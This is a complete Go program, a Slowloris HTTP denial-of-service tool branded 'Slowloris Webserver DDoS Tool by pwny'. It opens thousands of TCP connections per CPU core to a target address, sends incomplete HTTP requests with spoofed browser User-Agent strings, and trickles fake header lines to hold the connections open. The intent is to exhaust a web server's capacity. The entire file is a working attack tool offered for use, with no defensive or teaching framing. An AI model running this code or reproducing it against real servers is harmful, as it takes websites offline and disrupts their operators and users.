package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/beeemT/Packages/netutil"
)

var (
	agents = []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
	}

	timeout int
)

//handleConn keep alive msg for all time to ip
func handleConn(id int64, c *net.TCPConn, atomicCounter *int64) {
	conn := c
	defer conn.Close()

	packet := []byte(fmt.Sprintf("GET /%d HTTP/1.1\r\n", rand.Intn(5000)+1))
	conn.Write(packet)

	payload := []byte(fmt.Sprintf("User-Agent: %s\r\nAccept-language: en-US,en,q=0.5\r\n",
		agents[rand.Intn(len(agents))]))
	conn.Write(payload)

	for {
		time.Sleep(time.Duration(timeout) * time.Second)
		keepAliveMsg := []byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000)+1))
		_, err := conn.Write(keepAliveMsg)
		if err != nil {
			fmt.Printf("    [%d]%s\n", id, err.Error())
			atomic.AddInt64(atomicCounter, -1)
			runtime.Goexit()
		}
	}
}

func main() {
	targetP := flag.String("target", "", "Specifies the target IP address. It is in the form of address:port. In IPv6 no [] are needed, the port is seperated by the last : character.")
	timeoutP := flag.Int("timeout", 10, "Specifies the interval at which the keep alive messages are sent.")
	routinesP := flag.Int("routines", 10000, "Specifies the maximum amount of simultaneous routines used per processor core. Default is 10000. The minimum is 1 routine per core.")
	flag.Parse()

	if *targetP == "" {
		fmt.Println("targetHost address is empty.")
		flag.Usage()
		os.Exit(1)
	}

	delimIndex := strings.LastIndex(*targetP, ":")
	portStr := (*targetP)[delimIndex+1:]

	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("Error converting port: %s", err.Error())
		os.Exit(1)
	}

	addr, err := netutil.IP((*targetP)[:delimIndex])
	if err != nil {
		fmt.Println(err.Error())
		flag.Usage()
		os.Exit(1)
	}

	target := net.TCPAddr{IP: addr, Port: port}
	timeout = *timeoutP
	if timeout < 1 {
		fmt.Println("Timeout is too small. Defaulting to 4 seconds.")
		timeout = 4
	}

	routines := *routinesP
	maxroutines := int64(routines)
	if routines < 1 {
		routines = 1
	}

	printSlowlorisHeader()
	fmt.Printf("    Target: [%s]\n    Max concurrent routines: [%d]\n    Timeout Interval: [%d sec]\n\n", target.String(), runtime.NumCPU()*routines, timeout)

	fmt.Printf("    Press enter to start the attack.\n\n")
	consoleReader := bufio.NewReaderSize(os.Stdin, 1)
	inp, _ := consoleReader.ReadByte()
	if inp == 0 {
		os.Exit(0)
	}

	fmt.Printf("    Starting attack on [%d] routines per core ...\n", routines)

	var idCounter int64
	for index := 0; index < runtime.NumCPU(); index++ {
		go func() {
			var atomicCounter int64
			for {
				for atomicCounter < maxroutines {
					id := atomic.AddInt64(&idCounter, 1) - 1
					fmt.Printf("    [%d]Starting routine...\n", id)

					conn, err := net.DialTCP("tcp", nil, &target)
					if err != nil {
						fmt.Printf("    [%d]%s\n", id, err.Error())
						break
					}
					go handleConn(id, conn, &atomicCounter)
					atomic.AddInt64(&atomicCounter, 1)

					fmt.Printf("    [%d]Routine running\n", id)
				}
			}
		}()
	}

	var wg sync.WaitGroup
	wg.Add(1)
	wg.Wait()
}

func printSlowlorisHeader() {
	slowloris := `
         ___          ___   ___          ___          ___   ___          ___                     ___     
        /\  \        /\__\ /\  \        /\__\        /\__\ /\  \        /\  \         ___       /\  \    
       /::\  \      /:/  //::\  \      /:/ _/_      /:/  //::\  \      /::\  \       /\  \     /::\  \   
      /:/\ \  \    /:/  //:/\:\  \    /:/ /\__\    /:/  //:/\:\  \    /:/\:\  \      \:\  \   /:/\ \  \  
     _\:\~\ \  \  /:/  //:/  \:\  \  /:/ /:/ _/_  /:/  //:/  \:\  \  /::\~\:\  \     /::\__\ _\:\~\ \  \ 
    /\ \:\ \ \__\/:/__//:/__/ \:\__\/:/_/:/ /\__\/:/__//:/__/ \:\__\/:/\:\ \:\__\ __/:/\/__//\ \:\ \ \__\
    \:\ \:\ \/__/\:\  \\:\  \ /:/  /\:\/:/ /:/  /\:\  \\:\  \ /:/  /\/_|::\/:/  //\/:/  /   \:\ \:\ \/__/
     \:\ \:\__\   \:\  \\:\  /:/  /  \::/_/:/  /  \:\  \\:\  /:/  /    |:|::/  / \::/__/     \:\ \:\__\  
      \:\/:/  /    \:\  \\:\/:/  /    \:\/:/  /    \:\  \\:\/:/  /     |:|\/__/   \:\__\      \:\/:/  /  
       \::/  /      \:\__\\::/  /      \::/  /      \:\__\\::/  /      |:|  |      \/__/       \::/  /   
        \/__/        \/__/ \/__/        \/__/        \/__/ \/__/        \|__|                   \/__/    



    #####################################################################################################
    ########                                                                                     ########
    ##                                                                                                 ##
    #                              Slowloris Webserver DDoS Tool by pwny                                #
    ##                                                                                                 ##
    ########                                                                                     ########
    #####################################################################################################
`
	fmt.Println(slowloris)
}
